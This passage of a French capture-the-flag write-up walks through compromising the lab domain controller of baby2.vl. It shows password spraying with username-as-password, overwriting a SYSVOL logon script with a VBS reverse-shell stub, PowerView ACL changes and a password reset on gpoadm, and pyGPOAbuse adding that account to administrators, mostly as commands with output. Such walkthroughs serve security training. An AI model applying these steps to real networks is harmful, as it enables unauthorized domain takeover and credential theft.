SMB         10.129.234.72   445    DC               526: BABY2\Key Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               527: BABY2\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               553: BABY2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.72   445    DC               571: BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.72   445    DC               572: BABY2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.72   445    DC               1000: BABY2\DC$ (SidTypeUser)
SMB         10.129.234.72   445    DC               1101: BABY2\DnsAdmins (SidTypeAlias)
SMB         10.129.234.72   445    DC               1102: BABY2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.72   445    DC               1103: BABY2\gpoadm (SidTypeUser)
SMB         10.129.234.72   445    DC               1104: BABY2\office (SidTypeGroup)
SMB         10.129.234.72   445    DC               1105: BABY2\Joan.Jennings (SidTypeUser)
SMB         10.129.234.72   445    DC               1106: BABY2\Mohammed.Harris (SidTypeUser)
SMB         10.129.234.72   445    DC               1107: BABY2\Harry.Shaw (SidTypeUser)
SMB         10.129.234.72   445    DC               1108: BABY2\Carl.Moore (SidTypeUser)
SMB         10.129.234.72   445    DC               1109: BABY2\Ryan.Jenkins (SidTypeUser)
SMB         10.129.234.72   445    DC               1110: BABY2\Kieran.Mitchell (SidTypeUser)
SMB         10.129.234.72   445    DC               1111: BABY2\Nicola.Lamb (SidTypeUser)
SMB         10.129.234.72   445    DC               1112: BABY2\Lynda.Bailey (SidTypeUser)
SMB         10.129.234.72   445    DC               1113: BABY2\Joel.Hurst (SidTypeUser)
SMB         10.129.234.72   445    DC               1114: BABY2\Amelia.Griffiths (SidTypeUser)
SMB         10.129.234.72   445    DC               1602: BABY2\library (SidTypeUser)
SMB         10.129.234.72   445    DC               2601: BABY2\legacy (SidTypeGroup)
```

Je formatte alors la sortie de la commande précédente pour avoir un fichier `users.txt`.
```bash
/workspace/BabyTwo
❯ cat tmp | grep 'SidTypeUser' | awk '{print $6}' | cut -d '\' -f 2 > users.txt

/workspace/BabyTwo
❯ cat users.txt
Administrator
Guest
krbtgt
DC$
gpoadm
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
```

# Shell en tant que Amelia.Griffiths
## Password spraying

N'ayant pas de mot de passe pour tester la connexion avec les utilisateurs trouvés, j'utilise cette liste d'utilisateurs comme wordlist de mot de passe. Je trouve alors deux identifiants valides : `Carl.Moore:Carl.Moore`, `library:library`.
```bash
/workspace/BabyTwo
❯ nxc smb dc.baby2.vl -u users.txt -p users.txt --continue-on-success --no-bruteforce
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [-] baby2.vl\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\DC$:DC$ STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\gpoadm:gpoadm STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
SMB         10.129.234.72   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library
```

Je vois que **library** a plus d'accès sur le reste des partages.
```bash
/workspace/BabyTwo   7s
❯ nxc smb dc.baby2.vl -u library -p library --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE
SMB         10.129.234.72   445    DC               homes           READ,WRITE
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
```

Il en est de même pour **Carl.Moore**.
```bash
/workspace/BabyTwo
❯ nxc smb dc.baby2.vl -u Carl.Moore -p Carl.Moore --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE
SMB         10.129.234.72   445    DC               homes           READ,WRITE
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
```

En regardant les propriétés de `Carl.Moore`, je vois qu'il a un attribut `scriptPath`. Ce qui signifie qu'il **exécute un script de connexion (logon script)** à chaque ouverture de session. Le flag **`PASSWD_NOTREQD`** dans l’attribut **`userAccountControl`** signifie que **le compte n’est pas obligé d’avoir un mot de passe**.
```bash
bloodyAD -u Carl.Moore -p Carl.Moore --host baby2.vl -d baby2.vl get object Carl.Moore
```
![](/images/BabyTwo/BabyTwo-1.png)

## Login script abuse

Je recherche alors sur Google comment exploiter des scripts de connexion et je trouve cet article [Medium]([WriteScriptPath Abuse in Active Directory | by Furious5 | Medium](https://medium.com/@muneebnawaz3849/writescriptpath-abuse-in-active-directory-cb5945848a51)) qui explique comment le faire. Je crée un fichier `login.vbs` avec le contenu de reverse shell suivant :
```
Set oShell = CreateObject("WScript.Shell")
oShell.Run("MON_PAYLOAD_REVERSE_SHELL_POWERSHELL")
```
![](/images/BabyTwo/BabyTwo-4.png)

J'accède au partage `SYSVOL` et je remplace le fichier `login.vbs` par celui que j'ai créé.
```bash
/workspace/BabyTwo   739s
❯ smbclient.py baby2.vl/Carl.Moore:Carl.Moore@dc.baby2.vl
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use sysvol
# ls
drw-rw-rw-          0  Tue Aug 22 19:37:46 2023 .
drw-rw-rw-          0  Tue Aug 22 19:37:46 2023 ..
drw-rw-rw-          0  Tue Aug 22 19:37:46 2023 baby2.vl
# cd baby2.vl
# ls
drw-rw-rw-          0  Tue Aug 22 19:43:55 2023 .
drw-rw-rw-          0  Tue Aug 22 19:37:46 2023 ..
drw-rw-rw-          0  Tue Dec 23 21:56:40 2025 DfsrPrivate
drw-rw-rw-          0  Tue Aug 22 19:37:46 2023 Policies
drw-rw-rw-          0  Mon Aug 25 10:30:39 2025 scripts
# cd scripts
# ls
drw-rw-rw-          0  Mon Aug 25 10:30:39 2025 .
drw-rw-rw-          0  Tue Aug 22 19:43:55 2023 ..
-rw-rw-rw-        992  Mon Aug 25 13:23:29 2025 login.vbs
# rm login.vbs
# put login.vbs
# ls
drw-rw-rw-          0  Tue Dec 23 23:15:15 2025 .
drw-rw-rw-          0  Tue Aug 22 19:43:55 2023 ..
-rw-rw-rw-        467  Tue Dec 23 23:15:15 2025 login.vbs
```

## Shell

Quelques secondes plus tard, j'obtiens un shell en tant que **Carl.Moore**.
![](/images/BabyTwo/BabyTwo-5.png)

Je récupère le premier flag dans le répertoire `C:`.
![](/images/BabyTwo/BabyTwo-6.png)

# Shell en tant que GPOADM
## Bloodhound

Ensuite avec [rusthound]([GitHub - NH-RED-TEAM/RustHound: Active Directory data ingestor for BloodHound Legacy written in Rust. 🦀](https://github.com/NH-RED-TEAM/RustHound)), je récupère les relations entre les différents objets du domaine.
```bash
/workspace/BabyTwo   1146s
❯ rusthound -d baby2.vl -u Carl.Moore -p Carl.Moore
---------------------------------------------------
Initializing RustHound at 22:56:44 on 12/23/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-12-23T21:56:44Z INFO  rusthound] Verbosity level: Info
[2025-12-23T21:56:44Z INFO  rusthound::ldap] Connected to BABY2.VL Active Directory!
[2025-12-23T21:56:44Z INFO  rusthound::ldap] Starting data collection...
[2025-12-23T21:56:45Z INFO  rusthound::ldap] All data collected for NamingContext DC=baby2,DC=vl
[2025-12-23T21:56:45Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-12-23T21:56:45Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-12-23T21:56:45Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-12-23T21:56:45Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-12-23T21:56:45Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 16 users parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_users.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_groups.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_computers.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 3 ous parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_ous.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_domains.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_gpos.json created!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-12-23T21:56:45Z INFO  rusthound::json::maker] .//20251223225645_baby2-vl_containers.json created!

RustHound Enumeration Completed at 22:56:45 on 12/23/25! Happy Graphing!
```

`Nicola.Lamb`, membre du groupe `legacy`, possède les droits `WriteOwner` et `WriteDACL` sur le GPO `GPO-MANAGEMENT` ainsi que sur l'utilisateur `gpoadm`.
![](/images/BabyTwo/BabyTwo-2.png)

Il en est de meme pour l'utilisateur `Amelia.Griffiths`.
![](/images/BabyTwo/BabyTwo-3.png)

Ensuite l'utilisateur `gpoadm` possède les droits `GenericAll` sur les politiques `DEFAULT DOMAIN CONTROLLERS POLICY` et `DEFAULT DOMAIN POLICY`.
![](/images/BabyTwo/BabyTwo-7.png)

## GPO Abuse

Ce qui me donne le chemin d'exploitation suivant :
1. Donner tous les droits sur `GPOADM` à `Amelia.Griffiths`
2. Modifier le mot de passe de l'utilisateur `GPOADM`
3. Ajouter `GPOADM` dans le groupe `administrators`.

Je fais les deux premières étapes depuis mon shell obtenu. Je le ferai en utilisant les commandes [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
```bash
# Importer powerview.ps1
import-module ./powerview.ps1
# Donner tous les droits sur GPOADM à Amelia.Griffiths
add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
# Créer un mot de passe
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
# Attribuer le mot de passe à l'utilisateur GPOADM
set-domainuserpassword gpoadm -accountpassword $cred
```

Puis à l'aide [pygpoabuse.py](https://github.com/Hackndo/pyGPOAbuse), je crée une règle qui ajoute `GPOADM` dans le groupe `administrators`. Pour cela, je renseigne l'ID de la GPO `GPO-MANAGEMENT`.
```bash
/workspace/BabyTwo
❯ pygpoabuse.py baby2.vl/gpoadm:Password123 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators gpoadm /add' -f
SUCCESS:root:ScheduledTask TASK_7e11c30d created!
[+] ScheduledTask TASK_7e11c30d created!
```

## Shell

Comme avec la machine `Nanocorp`, `evil-winrm` ne fonctionne pas pour avoir un shell. J'utilise alors [evil-winrm.py](https://github.com/adityatelange/evil-winrm-py)
```bash
git clone https://github.com/adityatelange/evil-winrm-py
cd evil-winrm-py
pip install .
```

Je me connecte ensuite et je récupère le second flag.
```bash
evil-winrm -i dc.baby2.vl -u gpoadm -p 'Password123!'
```
![](/images/BabyTwo/BabyTwo-8.png)
